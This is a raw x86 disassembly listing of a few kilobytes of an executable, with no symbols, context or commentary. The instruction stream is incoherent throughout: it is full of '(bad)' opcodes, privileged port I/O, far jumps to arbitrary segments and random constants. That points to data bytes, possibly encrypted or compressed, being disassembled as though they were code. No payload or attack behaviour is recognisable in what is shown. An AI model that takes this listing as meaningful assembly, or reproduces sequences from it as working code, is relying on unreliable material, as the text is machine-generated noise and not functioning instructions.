  40c24c:	stos   DWORD PTR es:[edi],eax
  40c24d:	mov    eax,0x4eebced4
  40c252:	ror    ah,0x9b
  40c255:	in     eax,dx
  40c256:	out    dx,al
  40c257:	cdq    
  40c258:	push   ebx
  40c259:	add    bh,BYTE PTR [edi]
  40c25b:	sbb    ah,BYTE PTR [ecx]
  40c25d:	pop    esi
  40c25e:	jl     0x40c26e
  40c260:	adc    eax,edi
  40c262:	xor    edx,DWORD PTR [ebx]
  40c264:	repz jecxz 0x40c201
  40c267:	add    BYTE PTR [esi-0x5c33eb2b],dl
  40c26d:	and    BYTE PTR [eax],ch
  40c26f:	mov    eax,ds:0x5d3c5525
  40c274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c275:	test   eax,0x55ff1d9e
  40c27a:	pop    esp
  40c27b:	call   0x1b5b:0xc8262f52
  40c282:	pusha  
  40c283:	push   edx
  40c284:	push   esp
  40c285:	ret    0x68fd
  40c288:	jbe    0x40c240
  40c28a:	ds inc eax
  40c28c:	ins    BYTE PTR es:[edi],dx
  40c28d:	mov    ebp,0x8d1c49c1
  40c292:	mov    al,BYTE PTR [edx+0x71138f35]
  40c298:	daa    
  40c299:	(bad)  [esi-0x50917577]
  40c29f:	cli    
  40c2a0:	loope  0x40c2d6
  40c2a2:	xor    DWORD PTR [edi-0xc],eax
  40c2a5:	push   esi
  40c2a6:	dec    ebp
  40c2a7:	xchg   esp,eax
  40c2a8:	pop    ecx
  40c2a9:	in     al,dx
  40c2aa:	into   
  40c2ab:	rol    ah,1
  40c2ad:	shr    BYTE PTR [ecx],0x63
  40c2b0:	add    dh,BYTE PTR [ecx]
  40c2b2:	pusha  
  40c2b3:	inc    eax
  40c2b4:	in     al,dx
  40c2b5:	fld    QWORD PTR [esp+esi*8+0x36]
  40c2b9:	dec    esi
  40c2ba:	shl    BYTE PTR [ebx+0x6a15060f],0x2a
  40c2c1:	add    ecx,DWORD PTR [ecx]
  40c2c3:	test   eax,0x2c737c5f
  40c2c8:	in     al,dx
  40c2c9:	lea    edx,[ecx]
  40c2cb:	(bad)  
  40c2cc:	scas   eax,DWORD PTR es:[edi]
  40c2cd:	fild   WORD PTR [ebx]
  40c2cf:	gs hlt 
  40c2d1:	push   edx
  40c2d2:	cmp    BYTE PTR [edx],dl
  40c2d4:	gs (bad) 
  40c2d6:	mov    WORD PTR [edx+0xd0e41ba],?
  40c2dc:	push   ecx
  40c2dd:	dec    ebx
  40c2de:	les    esi,FWORD PTR [esi-0x33b03033]
  40c2e4:	or     BYTE PTR [ecx+0x278e4409],dl
  40c2ea:	mov    WORD PTR [ebx+0x13],?
  40c2ed:	push   ds
  40c2ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ef:	xlat   BYTE PTR ds:[ebx]
  40c2f0:	jl     0x40c342
  40c2f2:	jecxz  0x40c2b3
  40c2f4:	repnz (bad) 
  40c2f7:	jno    0x40c371
  40c2f9:	out    dx,al
  40c2fa:	jno    0x40c36e
  40c2fc:	push   eax
  40c2fd:	push   edx
  40c2fe:	ins    BYTE PTR es:[edi],dx
  40c2ff:	pop    ecx
  40c300:	pusha  
  40c301:	add    BYTE PTR [ebp+0x57],0x20
  40c305:	ficomp WORD PTR [esi+0x5e]
  40c308:	jp     0x40c377
  40c30a:	outs   dx,BYTE PTR ds:[esi]
  40c30b:	lods   eax,DWORD PTR ds:[esi]
  40c30c:	add    DWORD PTR [eax-0x5b],0x6a
  40c310:	jae    0x40c331
  40c312:	pop    edx
  40c313:	ja     0x40c38c
  40c315:	adc    bh,bl
  40c317:	imul   ebp,DWORD PTR [esi],0xffffffd7
  40c31a:	out    0xba,eax
  40c31c:	cmp    ah,0xe8
  40c31f:	pop    ebp
  40c320:	xor    edi,DWORD PTR [esi+0x2152f5ff]
  40c326:	imul   eax,DWORD PTR ds:0x489aaf00,0x9a3420c
  40c330:	inc    ecx
  40c331:	cli    
  40c332:	cwde   
  40c333:	mov    edi,0xc55f83cd
  40c338:	pop    esi
  40c339:	pop    ecx
  40c33a:	jo     0x40c397
  40c33c:	in     eax,dx
  40c33d:	or     BYTE PTR [ebx+0x67],cl
  40c340:	dec    ax
  40c342:	mov    edi,0xc18b30ee
  40c347:	jl     0x40c2d5
  40c349:	pop    edx
  40c34a:	fldenv [esi]
  40c34c:	dec    esp
  40c34d:	mov    ebp,0x7acafaff
  40c352:	loopne 0x40c351
  40c354:	mov    cl,0x4e
  40c356:	cmp    al,BYTE PTR [edx]
  40c358:	sub    eax,DWORD PTR ds:0xb18414f1
  40c35e:	sub    eax,0x90b3e280
  40c363:	idiv   DWORD PTR [ebx-0x6d]
  40c366:	cdq    
  40c367:	daa    
  40c368:	push   0xffffffaf
  40c36a:	fdivp  st(5),st
  40c36c:	test   BYTE PTR [ebx+0x45],al
  40c36f:	push   ecx
  40c370:	out    dx,al
  40c371:	rcr    dh,1
  40c373:	retf   0x22c5
  40c376:	jns    0x40c31b
  40c378:	and    dh,bh
  40c37a:	jmp    0x40c334
  40c37c:	dec    esp
  40c37d:	sub    BYTE PTR [eax+0x7b45e451],dh
  40c383:	dec    edx
  40c384:	jl     0x40c324
  40c386:	or     BYTE PTR [esi-0x48ec150b],dh
  40c38c:	xor    eax,0xc3316bd6
  40c391:	cli    
  40c392:	addr16 mov al,0xe1
  40c395:	(bad)  
  40c396:	shr    esi,1
  40c398:	enter  0xa973,0x85
  40c39c:	pop    ebx
  40c39d:	fisttp WORD PTR [esi]
  40c39f:	in     eax,0xfa
  40c3a1:	add    al,0xf5
  40c3a3:	repz xlat BYTE PTR ds:[ebx]
  40c3a5:	fs loop 0x40c32d
  40c3a8:	call   0xadca2dee
  40c3ad:	call   0xb06cc824
  40c3b2:	mov    ebx,DWORD PTR [ebx+0x51]
  40c3b5:	add    eax,0xa5eee37b
  40c3ba:	aas    
  40c3bb:	and    BYTE PTR [eax],bh
  40c3bd:	dec    esp
  40c3be:	mov    edi,0x1148d6c2
  40c3c3:	mov    ebp,0x3ce04f39
  40c3c8:	sub    edi,DWORD PTR [ecx-0x185faf58]
  40c3ce:	xchg   edi,eax
  40c3cf:	in     al,0xa3
  40c3d1:	es jo  0x40c3ab
  40c3d4:	data16 sbb ah,BYTE PTR [ecx]
  40c3d7:	clc    
  40c3d8:	jge    0x40c3ca
  40c3da:	jp     0x40c3cc
  40c3dc:	pushf  
  40c3dd:	push   ss
  40c3de:	add    al,0x36
  40c3e0:	(bad)  
  40c3e1:	mov    ?,WORD PTR [ebp+0x4e]
  40c3e4:	jae    0x40c3af
  40c3e6:	lahf   
  40c3e7:	xchg   edi,eax
  40c3e8:	inc    ebp
  40c3e9:	ins    BYTE PTR es:[edi],dx
  40c3ea:	sbb    ecx,DWORD PTR [ebx+ebp*1-0x26d74924]
  40c3f1:	aam    0x3e
  40c3f3:	imul   edi,edi,0x5a
  40c3f6:	(bad)  
  40c3f7:	xor    BYTE PTR [eax+ecx*2],bh
  40c3fa:	loop   0x40c42d
  40c3fc:	cmp    dl,BYTE PTR cs:[ebp-0x62]
  40c400:	xchg   edx,eax
  40c401:	mov    ch,0x66
  40c403:	add    al,0xf3
  40c405:	loope  0x40c396
  40c407:	daa    
  40c408:	in     al,dx
  40c409:	add    eax,0xe1ebfaa0
  40c40e:	push   edx
  40c40f:	xchg   ebx,eax
  40c410:	lahf   
  40c411:	pop    eax
  40c412:	jnp    0x40c3d3
  40c414:	sub    dh,BYTE PTR [ebx+0x2d5637e]
  40c41a:	jecxz  0x40c487
  40c41c:	stos   DWORD PTR es:[edi],eax
  40c41d:	jmp    0xf84d:0x5f844317
  40c424:	rcr    BYTE PTR [esi+0x11],1
  40c427:	xor    eax,DWORD PTR [ebx]
  40c429:	sub    eax,0x63c130ee
  40c42e:	adc    eax,0xfdb85a53
  40c433:	mov    dh,0xb
  40c435:	pop    ds
  40c436:	mov    DWORD PTR [edi+esi*2],esi
  40c439:	push   ss
  40c43a:	push   edi
  40c43b:	cmp    al,dh
  40c43d:	and    al,0x1e
  40c43f:	test   al,0x41
  40c441:	and    eax,edx
  40c443:	daa    
  40c444:	out    dx,eax
  40c445:	mov    edx,0x538ac728
  40c44a:	imul   esi,DWORD PTR [eax+0x42946475],0x40
  40c451:	stos   DWORD PTR es:[edi],eax
  40c452:	ins    BYTE PTR es:[edi],dx
  40c453:	xchg   DWORD PTR [ecx+0x55],eax
  40c456:	cmp    bh,BYTE PTR [esi-0x63078a14]
  40c45c:	mov    ebx,0xf6b6cbb6
  40c461:	jle    0x40c44f
  40c463:	inc    ebp
  40c464:	stc    
  40c465:	mov    eax,0x96f341fc
  40c46a:	mov    ch,0x34
  40c46c:	or     eax,0xce46c0c6
  40c471:	es pop ss
  40c473:	inc    esp
  40c474:	mov    edx,0x75b7ffde
  40c479:	cdq    
  40c47a:	adc    eax,0x3c6a5958
  40c47f:	inc    edx
  40c480:	cdq    
  40c481:	or     al,BYTE PTR [eax]
  40c483:	mov    DWORD PTR [eax-0x4751627f],0xcd2e8cf0
  40c48d:	jge    0x40c46b
  40c48f:	sbb    ah,dh
  40c491:	fiadd  WORD PTR [esi+0x7eb13680]
  40c497:	adc    eax,ebx
  40c499:	std    
  40c49a:	loop   0x40c461
  40c49c:	push   ss
  40c49d:	jp     0x40c496
  40c49f:	dec    ecx
  40c4a0:	leave  
  40c4a1:	iret   
  40c4a2:	loop   0x40c4f4
  40c4a4:	les    esi,FWORD PTR [eax-0x5676ba66]
  40c4aa:	xor    DWORD PTR [edx-0x5c],ebp
  40c4ad:	scas   al,BYTE PTR es:[edi]
  40c4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4af:	mov    BYTE PTR [ebx+0x33],0xa1
  40c4b3:	mov    cl,0xd1
  40c4b5:	mov    WORD PTR [ecx+0x1f],fs
  40c4b8:	jne    0x40c449
  40c4ba:	scas   al,BYTE PTR es:[edi]
  40c4bb:	mov    dh,BYTE PTR [ecx-0x4e4df44]
  40c4c1:	jno    0x40c4ac
  40c4c3:	cmp    eax,esp
  40c4c5:	lods   al,BYTE PTR ss:[esi]
  40c4c7:	inc    ebx
  40c4c8:	mov    cl,0x9c
  40c4ca:	inc    eax
  40c4cb:	js     0x40c53f
  40c4cd:	cmp    al,0x38
  40c4cf:	or     cl,al
  40c4d1:	dec    ecx
  40c4d2:	addr16 push es
  40c4d4:	sub    BYTE PTR [esi-0x6ab1a9e8],ah
  40c4da:	mov    ch,0xc
  40c4dc:	jle    0x40c4a7
  40c4de:	xchg   esp,ecx
  40c4e0:	std    
  40c4e1:	xor    al,0x7b
  40c4e3:	adc    DWORD PTR [ebx],esi
  40c4e5:	push   esp
  40c4e6:	in     eax,dx
  40c4e7:	in     al,dx
  40c4e8:	sub    esp,DWORD PTR [ebx]
  40c4ea:	mov    es,esi
  40c4ec:	jno    0x40c521
  40c4ee:	in     al,0x45
  40c4f0:	cmp    eax,0x1594eb6b
  40c4f5:	mov    ah,ah
  40c4f7:	or     DWORD PTR [ebx-0x67],0xffffff9a
  40c4fb:	and    cl,BYTE PTR [eax+edi*1]
  40c4fe:	(bad)
  40c501:	mov    esp,0x1ac09834
  40c506:	mov    ch,0xe9
  40c508:	push   ds
  40c509:	or     eax,0x3f35b430
  40c50e:	xchg   edi,eax
  40c50f:	js     0x40c4f3
  40c511:	xchg   esi,eax
  40c512:	fwait
  40c513:	stos   DWORD PTR es:[edi],eax
  40c514:	push   eax
  40c515:	cmp    eax,0x65aa69dc
  40c51a:	jle    0x40c599
  40c51c:	xor    BYTE PTR ds:[esi+edx*1],0x2e
  40c521:	ins    DWORD PTR es:[edi],dx
  40c522:	and    edi,DWORD PTR [ecx]
  40c524:	in     eax,0x28
  40c526:	jecxz  0x40c579
  40c528:	ds rcr bh,cl
  40c52b:	mov    bl,0xc8
  40c52d:	bound  ecx,QWORD PTR [ecx-0x88eb451]
  40c533:	mov    edi,0x1dc6722b
  40c538:	retf   
  40c539:	jbe    0x40c516
  40c53b:	push   esp
  40c53c:	retf   
  40c53d:	sbb    bh,0xd
  40c540:	shl    BYTE PTR [esi-0x81ce3f9],0xef
  40c547:	ret    
  40c548:	into   
  40c549:	clc    
  40c54a:	fdivr  QWORD PTR [edi-0x49f6e2ce]
  40c550:	add    eax,0x5b2d8a90
  40c555:	pop    esi
  40c556:	jns    0x40c552
  40c558:	mov    edi,0x87b5e21b
  40c55d:	arpl   bx,dx
  40c55f:	jle    0x40c583
  40c561:	cmp    al,0x70
  40c563:	retf   
  40c564:	inc    ebp
  40c565:	(bad)  
  40c566:	gs xchg edx,eax
  40c568:	push   ss
  40c569:	jecxz  0x40c5c2
  40c56b:	xlat   BYTE PTR ds:[ebx]
  40c56c:	jecxz  0x40c5da
  40c56e:	test   al,0x94
  40c570:	mov    ebp,0x2b389f85
  40c575:	push   ecx
  40c576:	mov    ebp,DWORD PTR [ebp-0x40]
  40c579:	sub    al,0x6b
  40c57b:	mov    ds:0x827f2717,eax
  40c580:	shl    BYTE PTR [esp+eax*2],0x7a
  40c584:	scas   eax,DWORD PTR es:[edi]
  40c585:	pop    edx
  40c586:	sub    BYTE PTR [edx],dl
  40c588:	imul   edx,ebp,0x22e15d7a
  40c58e:	rol    BYTE PTR [ebp+0x6d],cl
  40c591:	mov    dl,dh
  40c593:	dec    ecx
  40c594:	jo     0x40c5f4
  40c596:	lea    edx,[edi+0x3a]
  40c599:	mov    dh,0x1c
  40c59b:	and    bh,dl
  40c59d:	jp     0x40c530
  40c59f:	sub    BYTE PTR [eax+0x24abec49],0x3c
  40c5a6:	push   es
  40c5a7:	fxtract 
  40c5a9:	add    ch,BYTE PTR [edx+ecx*8+0x3f]
  40c5ad:	jno    0x40c557
  40c5af:	dec    esi
  40c5b0:	jo     0x40c628
  40c5b2:	lahf   
  40c5b3:	jns    0x40c566
  40c5b5:	loope  0x40c60f
  40c5b7:	aas    
  40c5b8:	cmp    BYTE PTR [ebp-0x24],ch
  40c5bb:	retf   0xbaac
  40c5be:	mov    ebp,0x70b94a0b
  40c5c3:	loop   0x40c5a6
  40c5c5:	popa   
  40c5c6:	dec    ebx
  40c5c7:	nop
  40c5c8:	out    dx,eax
  40c5c9:	add    BYTE PTR [eiz*2+0x784fd21e],0x2a
  40c5d1:	fidivr WORD PTR [edi-0x59]
  40c5d4:	jae    0x40c5d3
  40c5d6:	jmp    0xd593:0xfe723761
  40c5dd:	or     DWORD PTR [ecx],edi
  40c5df:	aas    
  40c5e0:	popa   
  40c5e1:	loop   0x40c581
  40c5e3:	adc    DWORD PTR [eax*8-0x56b9c35a],ecx
  40c5ea:	pop    edi
  40c5eb:	shl    bh,cl
  40c5ed:	loop   0x40c651
  40c5ef:	je     0x40c598
  40c5f1:	inc    ecx
  40c5f2:	pop    esi
  40c5f3:	outs   dx,BYTE PTR ds:[esi]
  40c5f4:	shl    DWORD PTR [eax-0x34],0x39
  40c5f8:	pop    esp
  40c5f9:	add    eax,DWORD PTR [ecx+0x4b6fad2e]
  40c5ff:	inc    edx
  40c600:	dec    ecx
  40c601:	out    dx,eax
  40c602:	je     0x40c637
  40c604:	aaa    
  40c605:	xchg   ecx,eax
  40c606:	je     0x40c5ec
  40c608:	xor    edx,0xffffffa9
  40c60b:	outs   dx,DWORD PTR ds:[esi]
  40c60c:	cdq    
  40c60d:	mov    bl,BYTE PTR [eax]
  40c60f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c611:	inc    esp
  40c612:	or     DWORD PTR [edi-0x3078bf0f],ebx
  40c618:	aas    
  40c619:	ror    DWORD PTR [eax],0xc5
  40c61c:	popa   
  40c61d:	scas   al,BYTE PTR es:[edi]
  40c61e:	cs (bad) 
  40c620:	inc    eax
  40c622:	jl     0x40c5e8
  40c624:	nop
  40c625:	aas    
  40c626:	enter  0xb69a,0xe2
  40c62a:	dec    eax
  40c62b:	mov    ebp,0x2fb8496c
  40c630:	js     0x40c5d8
  40c632:	lock ffreep st(0)
  40c635:	aas    
  40c636:	cli    
  40c637:	nop    DWORD PTR [ebp-0x78]
  40c63b:	inc    eax
  40c63c:	add    ch,cl
  40c63e:	dec    eax
  40c63f:	adc    BYTE PTR [edi],0xc2
  40c642:	jmp    0x7643:0xd2611d01
  40c649:	xor    eax,0x7c3e34be
  40c64e:	mov    eax,DWORD PTR [edx]
  40c650:	mov    dl,0xb8
  40c652:	cmp    esp,DWORD PTR [eax+0x5f]
  40c655:	push   edi
  40c656:	pop    es
  40c657:	mov    bl,0x83
  40c659:	scas   al,BYTE PTR es:[edi]
  40c65a:	(bad)  
  40c65b:	sbb    BYTE PTR [edi-0x5fb60a03],dl
  40c661:	out    dx,al
  40c662:	icebp  
  40c663:	outs   dx,DWORD PTR ds:[esi]
  40c664:	aad    0xf6
  40c666:	mov    ah,BYTE PTR [edi-0x74691b0f]
  40c66c:	pop    ss
  40c66d:	in     eax,0xdc
  40c66f:	sub    bh,BYTE PTR ds:0x23bb4ed4
  40c675:	repnz pop ebp
  40c677:	mov    WORD PTR [ebp-0x6d80991a],?
  40c67d:	stos   DWORD PTR es:[edi],eax
  40c67e:	imul   edi,DWORD PTR [edi+edi*8-0x39],0x14bf9d97
  40c686:	push   0xf64f0e39
  40c68b:	dec    esi
  40c68c:	adc    ah,BYTE PTR [edi]
  40c68e:	test   eax,0x56d1742a
  40c693:	ins    BYTE PTR es:[edi],dx
  40c694:	jge    0x40c65e
  40c696:	adc    esp,DWORD PTR [esi]
  40c698:	jle    0x40c6df
  40c69a:	lea    esp,[esi-0x611052b7]
  40c6a0:	mov    esi,DWORD PTR [esi-0x78]
  40c6a3:	pop    ax
  40c6a5:	jle    0x40c637
  40c6a7:	adc    BYTE PTR [ebx],0x17
  40c6aa:	xchg   esp,eax
  40c6ab:	sbb    al,0x7d
  40c6ad:	in     eax,0xa
  40c6af:	ss mov eax,0x6555edad
  40c6b5:	mov    eax,0xd37ca91
  40c6ba:	xor    eax,0xb85975f3
  40c6bf:	xlat   BYTE PTR ds:[ebx]
  40c6c0:	xor    al,0x35
  40c6c2:	int3   
  40c6c3:	pop    ecx
  40c6c4:	ror    esp,cl
  40c6c6:	mov    bh,0x75
  40c6c8:	repnz out 0x80,eax
  40c6cb:	(bad)  
  40c6cc:	cmovge esp,DWORD PTR [edx+0x4531e1a9]
  40c6d3:	sahf   
  40c6d4:	push   edi
  40c6d5:	jl     0x40c724
  40c6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6d8:	inc    eax
  40c6d9:	in     al,0xd2
  40c6db:	xchg   ebx,eax
  40c6dc:	psrld  mm5,QWORD PTR [edi+0x1c]
  40c6e0:	and    BYTE PTR [ebx],0x57
  40c6e3:	mov    ebp,0xc67e0715
  40c6e8:	sahf   
  40c6e9:	dec    ecx
  40c6ea:	or     DWORD PTR [eax],0x24
  40c6ed:	pop    edx
  40c6ee:	(bad)  
  40c6ef:	nop
  40c6f0:	jnp    0x40c72f
  40c6f2:	stc    
  40c6f3:	ss xchg ah,bh
  40c6f6:	xchg   ebx,eax
  40c6f7:	stos   DWORD PTR es:[edi],eax
  40c6f8:	aad    0x6c
  40c6fa:	fdivr  DWORD PTR [edi-0x2d292a6c]
  40c700:	or     dh,BYTE PTR [edi]
  40c702:	xor    BYTE PTR [esp+eiz*4-0x67],0xd3
  40c707:	fcmovbe st,st(0)
  40c709:	fcmovbe st,st(3)
  40c70b:	mov    BYTE PTR [ecx-0x47],dh
  40c70e:	push   0xb4d03d98
  40c713:	dec    esi
  40c714:	pop    ecx
  40c715:	(bad)  
  40c716:	mov    BYTE PTR [edx+0x27],0x91
  40c71a:	fdivr  QWORD PTR [ebx+0x1a]
  40c71d:	dec    BYTE PTR ds:0xcc2b9b5a
  40c723:	int    0x4e
  40c725:	mov    bl,0x17
  40c727:	xchg   esp,eax
  40c728:	or     eax,0xab710c3e
  40c72d:	jo     0x40c729
  40c72f:	mov    bh,0x2f
  40c731:	push   ss
  40c732:	stc    
  40c733:	imul   eax,DWORD PTR [ebp-0x75],0x6d
  40c737:	jo     0x40c734
  40c739:	add    al,0x5a
  40c73b:	test   cl,dh
  40c73d:	ins    DWORD PTR es:[edi],dx
  40c73e:	in     al,dx
  40c73f:	stc    
  40c740:	mov    ds:0x5661780f,al
  40c745:	cmp    bh,al
  40c747:	inc    edi
  40c748:	mov    cl,ah
  40c74a:	stos   BYTE PTR es:[edi],al
  40c74b:	in     al,dx
  40c74c:	cmp    al,0xd1
  40c74e:	pop    ss
  40c74f:	mov    cl,0x20
  40c751:	in     eax,dx
  40c752:	sahf   
  40c753:	lds    edi,FWORD PTR [edx-0x6e]
  40c756:	mov    edx,0x63072557
  40c75b:	loope  0x40c724
  40c75d:	or     DWORD PTR [ebx+0xd5038fc],eax
  40c763:	sub    ch,cl
  40c765:	out    0xc2,al
  40c767:	inc    edi
  40c768:	inc    esi
  40c769:	pop    ebx
  40c76a:	inc    ecx
  40c76b:	dec    eax
  40c76c:	fs mov al,0xa7
  40c76f:	test   al,0x0
  40c771:	jbe    0x40c7af
  40c773:	outs   dx,BYTE PTR ds:[esi]
  40c774:	cli    
  40c775:	loope  0x40c744
  40c777:	sub    al,0x81
  40c779:	inc    edx
  40c77a:	pop    ebx
  40c77b:	pop    ebx
  40c77c:	push   ebx
  40c77d:	es push eax
  40c77f:	repz fimul WORD PTR [edx]
  40c782:	ret    0x5e3f
  40c785:	aas    
  40c786:	cmp    dl,cl
  40c788:	ret    
  40c789:	lods   eax,DWORD PTR ds:[esi]
  40c78a:	jl     0x40c809
  40c78c:	push   0xf898b093
  40c791:	xchg   DWORD PTR [esi],edi
  40c793:	jmp    0xbbf3:0xce70dc7c
  40c79a:	fsub   DWORD PTR [esi-0x4e]
  40c79d:	daa    
  40c79e:	cmc    
  40c79f:	ret    0x1da7
  40c7a2:	(bad)  
  40c7a3:	and    bh,dh
  40c7a5:	pop    esi
  40c7a6:	dec    ebp
  40c7a7:	inc    esp
  40c7a8:	mov    BYTE PTR [esi+edx*2+0x1c925529],dh
  40c7af:	addr16 inc edi
  40c7b1:	les    esp,FWORD PTR [edx+0x37]
  40c7b4:	jmp    0x3ae5:0x1b7a176a
  40c7bb:	xchg   ebx,eax
  40c7bc:	in     eax,dx
  40c7bd:	aad    0x85
  40c7bf:	add    eax,0xd0636120
  40c7c4:	or     esp,DWORD PTR [ecx]
  40c7c6:	mov    BYTE PTR es:[esi+0x73],0x7d
  40c7cb:	lods   eax,DWORD PTR ds:[esi]
  40c7cc:	pusha  
  40c7cd:	push   ebp
  40c7ce:	cmc    
  40c7cf:	shl    DWORD PTR [eax+0x61],0x92
  40c7d3:	(bad)  
  40c7d4:	in     eax,0x5c
  40c7d6:	neg    DWORD PTR [ebx+0x53]
  40c7d9:	pushf  
  40c7da:	int    0x36
  40c7dc:	adc    esi,edx
  40c7de:	add    DWORD PTR [edx],ecx
  40c7e0:	sahf   
  40c7e1:	test   al,0xd5
  40c7e3:	jnp    0x40c7fe
  40c7e5:	sbb    DWORD PTR [ecx],esp
  40c7e7:	pop    es
  40c7e8:	lock jne 0x40c82f
  40c7eb:	popa   
  40c7ec:	test   BYTE PTR [esi-0x12bbbb5b],ah
  40c7f2:	cmp    al,BYTE PTR [eax-0x5b]
  40c7f5:	dec    eax
  40c7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7f7:	and    al,0x4
  40c7f9:	loope  0x40c860
  40c7fb:	addr16 jno 0x40c787
  40c7fe:	jo     0x40c832
  40c800:	add    DWORD PTR [edi-0x72],esp
  40c803:	cdq    
  40c804:	inc    edi
  40c805:	js     0x40c837
  40c807:	dec    edx
  40c808:	loope  0x40c81a
  40c80a:	test   DWORD PTR [esi+0x56],edx
  40c80d:	add    al,BYTE PTR [esi-0x49]
  40c810:	xor    BYTE PTR [esi+0x2dea06eb],bl
  40c816:	mov    dl,0x20
  40c818:	loope  0x40c812
  40c81a:	scas   eax,DWORD PTR es:[edi]
  40c81b:	mov    edx,0x449e1951
  40c820:	test   al,0xc3
  40c822:	shl    ecx,1
  40c824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c825:	sub    al,bl
  40c827:	jb     0x40c863
  40c829:	fldcw  WORD PTR [ebp+0x5149cd68]
  40c82f:	cmc    
  40c830:	fsubr  DWORD PTR [esi-0x40083a61]
  40c836:	nop    DWORD PTR [edi-0x2ebffe2c]
  40c83d:	out    0x6,al
  40c83f:	sub    BYTE PTR [eax+esi*8],al
  40c842:	add    al,0xd8
  40c844:	aam    0xab
  40c846:	inc    edi
  40c847:	fwait
  40c848:	xchg   DWORD PTR [edx],eax
  40c84a:	pusha  
  40c84b:	push   esi
  40c84c:	pop    ds
  40c84d:	lods   eax,DWORD PTR ds:[esi]
  40c84e:	das    
  40c84f:	gs mov al,0xde
  40c852:	push   cs
  40c853:	adc    DWORD PTR [ebx+ebx*2+0x43],eax
  40c857:	xchg   edi,eax
  40c858:	loop   0x40c84e
  40c85a:	lea    eax,[edx+eax*4-0x17]
  40c85e:	or     eax,0xcc9fecef
  40c863:	jbe    0x40c81d
  40c865:	sub    eax,0xbf179262
  40c86a:	pop    edi
  40c86b:	fwait
  40c86c:	sbb    eax,0xfed4ac74
  40c871:	mov    DWORD PTR [esi-0x78384d83],edx
  40c877:	(bad)  
  40c879:	pop    es
  40c87a:	ret    
  40c87b:	rcr    DWORD PTR [edx+0x1c],cl
  40c87e:	mov    dl,BYTE PTR [ebx*1+0xdf1e3d5]
  40c885:	pop    ebx
  40c886:	arpl   WORD PTR [ebx+0x51651044],cx
  40c88c:	dec    esp
  40c88d:	and    bh,ah
  40c88f:	out    0x1,al
  40c891:	das    
  40c892:	pop    edi
  40c893:	(bad)  
  40c894:	ror    ch,cl
  40c896:	out    dx,al
  40c897:	jg     0x40c84a
  40c899:	ror    DWORD PTR [bx+di],cl
  40c89c:	(bad)  
  40c89d:	call   DWORD PTR [edx+0x7c55962a]
  40c8a3:	xor    esp,esi
  40c8a5:	inc    esp
  40c8a6:	jno    0x40c8ee
  40c8a8:	jle    0x40c895
  40c8aa:	call   0x934a0865
  40c8af:	cli    
  40c8b0:	mov    bl,0xfe
  40c8b2:	jle    0x40c842
  40c8b4:	aam    0x6f
  40c8b6:	es inc ebx
  40c8b8:	mov    bl,0x34
  40c8ba:	adc    BYTE PTR [esi-0x5d],0x8c
  40c8be:	jns    0x40c86c
  40c8c0:	fnstsw WORD PTR ds:0x7fd9f235
  40c8c6:	nop
  40c8c7:	lds    ebx,FWORD PTR [ebx]
  40c8c9:	inc    edx
  40c8ca:	and    eax,0x91bb605b
  40c8cf:	scas   eax,DWORD PTR es:[edi]
  40c8d0:	sub    eax,0x74a9a152
  40c8d5:	loope  0x40c86e
  40c8d7:	jb     0x40c94b
  40c8d9:	iret   
  40c8da:	xor    DWORD PTR [ecx+0x44],esi
  40c8dd:	ss pop edx
  40c8df:	int    0x1c
  40c8e1:	cdq    
  40c8e2:	jl     0x40c864
  40c8e4:	fsubr  QWORD PTR [ebx]
  40c8e6:	ja     0x40c90e
  40c8e8:	aad    0x80
  40c8ea:	mov    ebp,0x73b7ecd5
  40c8ef:	dec    ebp
  40c8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8f1:	ror    DWORD PTR [edx+0x6114d3f2],1
  40c8f7:	add    eax,0x74ebee62
  40c8fc:	sub    eax,0xe31bf1b2
  40c901:	dec    ebp
  40c902:	inc    esp
  40c903:	jle    0x40c935
  40c905:	arpl   WORD PTR ds:0xde14810b,di
  40c90b:	adc    DWORD PTR [ebx+ebp*8-0x1e],ebp
  40c90f:	mov    bh,0x72
  40c911:	dec    ebx
  40c912:	xor    al,0xf1
  40c914:	or     eax,esp
  40c916:	mov    WORD PTR [ecx+0x341271ad],cs
  40c91c:	xchg   esi,eax
  40c91d:	imul   esi,eax,0x58856a03
  40c923:	inc    edx
  40c924:	pop    ebp
  40c925:	or     eax,0xa5266ffe
  40c92a:	out    dx,al
  40c92b:	push   cs
  40c92c:	mov    bl,0xa9
  40c92e:	in     eax,dx
  40c92f:	gs std 
  40c931:	outs   dx,BYTE PTR ds:[esi]
  40c932:	stos   BYTE PTR es:[edi],al
  40c933:	aas    
  40c934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c935:	mov    edx,0x25087d29
  40c93a:	std    
  40c93b:	dec    ebp
  40c93c:	daa    
  40c93d:	dec    ebp
  40c93e:	add    BYTE PTR [ebp+0x3e],0xe3
  40c942:	ds adc eax,0xc86df5c
  40c948:	push   0xe
  40c94a:	les    esp,FWORD PTR [esi-0x70]
  40c94d:	cld    
  40c94e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c94f:	vmread DWORD PTR [edx-0x428c6a37],ebx
  40c956:	repnz xor BYTE PTR [ecx+0x3e],dh
  40c95a:	adc    eax,0xb5610d7a
  40c95f:	xchg   bh,dh
  40c961:	div    BYTE PTR [eax-0x4ae7c809]
  40c967:	shr    BYTE PTR [edx+eax*8+0x6b],cl
  40c96b:	cmp    cl,BYTE PTR [ebx]
  40c96d:	cmp    eax,0xdbf595e2
  40c972:	xchg   ecx,eax
  40c973:	xor    BYTE PTR [edi],dl
  40c975:	push   edi
  40c976:	imul   esp,DWORD PTR [ecx-0x2e],0x1c54a519
  40c97d:	mov    esp,0xe6359d91
  40c982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c983:	mov    edi,0x8b94d0c
  40c988:	cmp    edi,ebx
  40c98a:	aad    0xef
  40c98c:	mov    BYTE PTR [eax],cl
  40c98e:	into   
  40c98f:	fnsave [edi]
  40c991:	pop    edi
  40c992:	in     eax,0x27
  40c994:	jbe    0x40c9b9
  40c996:	push   edi
  40c997:	inc    edx
